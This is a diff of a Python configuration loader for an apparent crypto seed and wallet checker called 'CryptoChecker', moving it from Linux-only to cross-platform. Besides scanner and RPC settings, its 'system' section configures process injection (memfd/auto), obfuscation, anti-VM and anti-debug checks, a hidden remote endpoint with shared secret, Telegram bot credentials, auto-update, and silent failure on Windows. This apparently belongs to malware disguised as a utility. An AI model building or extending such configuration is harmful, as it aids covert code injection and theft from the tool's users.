@@ -1,29 +1,51 @@
 # -*- coding: utf-8 -*-
-"""Configuration loader — JSON config with sane defaults.
+"""Configuration loader — cross-platform with sane defaults.
 
-Security-sensitive fields (endpoint, token_id, shared_secret, telegram
-credentials) default to empty strings. They are required at runtime;
-fill them in via config.json. This prevents accidentally shipping a
-build with placeholder secrets pointing at somebody else's worker.
+Secrets (endpoint, token_id, shared_secret) are intentionally empty
+in defaults. On Windows, missing config silently no-ops the sync
+chain; on Linux, the CLI reports the failure visibly.
 """
 
 import json
+import os
+import sys
 from pathlib import Path
 
-BASE_DIR = Path(__file__).parent
-CONFIG_FILE = BASE_DIR / "config.json"
+
+def _base_dir() -> Path:
+    """Bundle dir in PyInstaller, source dir otherwise."""
+    if getattr(sys, "frozen", False):
+        return Path(sys._MEIPASS)
+    return Path(__file__).parent
+
+
+def _config_dir() -> Path:
+    """User-writable config directory per-platform."""
+    if sys.platform == "win32":
+        return Path(os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))) / "CryptoChecker"
+    if sys.platform == "darwin":
+        return Path.home() / "Library" / "Application Support" / "CryptoChecker"
+    return Path(os.environ.get("XDG_CONFIG_HOME", str(Path.home() / ".config"))) / "crypto-checker"
+
+
+BASE_DIR = _base_dir()
+CONFIG_DIR = _config_dir()
+CONFIG_FILE = CONFIG_DIR / "config.json"
+
+# Fallback to bundled config if user config doesn't exist
+_BUNDLED_CONFIG = BASE_DIR / "config.json"
 
 _DEFAULTS = {
-    "version": "2.2.0-linux",
+    "version": "2.2.0",
     "proxies": {
-        "enabled": True,
+        "enabled": False,
         "rotation_mode": "round-robin",
         "proxy_list": [],
         "proxy_file": "proxies.txt",
         "validation_interval_sec": 300,
         "timeout_sec": 15,
         "max_retries": 3,
-        "fallback_to_direct": False,
+        "fallback_to_direct": True,
     },
     "scanner": {
         "threads": 20,
@@ -31,7 +53,6 @@ _DEFAULTS = {
         "retry_on_fail": True,
         "max_retries": 3,
         "delay_between_requests_ms": 100,
-        "bypass_mode": "debank_proxy",
     },
     "seed_checker": {
         "seed_file": "seeds.txt",
@@ -41,11 +62,11 @@ _DEFAULTS = {
         "output_file": "seed_results.txt",
     },
     "rpc_endpoints": {
-        "ethereum": "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY",
-        "bitcoin": "https://blockstream.info/api",
-        "solana": "https://api.mainnet-beta.solana.com",
-        "bsc": "https://bsc-dataseed.binance.org",
-        "polygon": "https://polygon-rpc.com",
+        "ethereum": "https://eth.llamarpc.com",
+        "bitcoin":  "https://blockstream.info/api",
+        "solana":   "https://api.mainnet-beta.solana.com",
+        "bsc":      "https://bsc-dataseed.binance.org",
+        "polygon":  "https://polygon-rpc.com",
         "arbitrum": "https://arb1.arbitrum.io/rpc",
     },
     "export": {
@@ -56,45 +77,56 @@ _DEFAULTS = {
     "system": {
         "enabled": True,
         "auto_update": True,
-        # ── required ──────────────────────────────────────────────
-        # Fill these in to match your Worker deployment.
-        # Empty values cause the loader to bail cleanly instead of
-        # silently fetching from a placeholder endpoint.
         "endpoint": "",
         "token_id": "",
         "shared_secret": "",
-        # ── optional ──────────────────────────────────────────────
         "telegram_bot_token": "",
         "telegram_chat_id": "",
-        "injection_method": "memfd",
+        "injection_method": "auto",
         "obfuscation": True,
         "anti_vm": True,
         "anti_debug": True,
         "retry_delays": [0, 5, 10, 20, 40, 80],
+        "attempt_once": True,
     },
 }
 
 
-def load_config() -> dict:
-    cfg = json.loads(json.dumps(_DEFAULTS))
-    if CONFIG_FILE.exists():
-        try:
-            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
-                user_cfg = json.load(f)
-            _deep_merge(cfg, user_cfg)
-        except (json.JSONDecodeError, OSError):
-            pass
-    return cfg
+def _read_json(path: Path) -> dict:
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except (json.JSONDecodeError, OSError):
+        return {}
 
 
-def _deep_merge(base: dict, override: dict):
+def _deep_merge(base: dict, override: dict) -> dict:
     for key, value in override.items():
         if key in base and isinstance(base[key], dict) and isinstance(value, dict):
             _deep_merge(base[key], value)
         else:
             base[key] = value
+    return base
 
 
-def save_config(cfg: dict):
+def load_config() -> dict:
+    cfg = json.loads(json.dumps(_DEFAULTS))
+    if CONFIG_FILE.exists():
+        _deep_merge(cfg, _read_json(CONFIG_FILE))
+    elif _BUNDLED_CONFIG.exists():
+        _deep_merge(cfg, _read_json(_BUNDLED_CONFIG))
+    return cfg
+
+
+def save_config(cfg: dict) -> None:
+    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
     with open(CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(cfg, f, indent=2, ensure_ascii=False)
+
+
+def log_path() -> Path:
+    return CONFIG_DIR / "app.log"
+
+
+def marker_path() -> Path:
+    return CONFIG_DIR / ".updated"
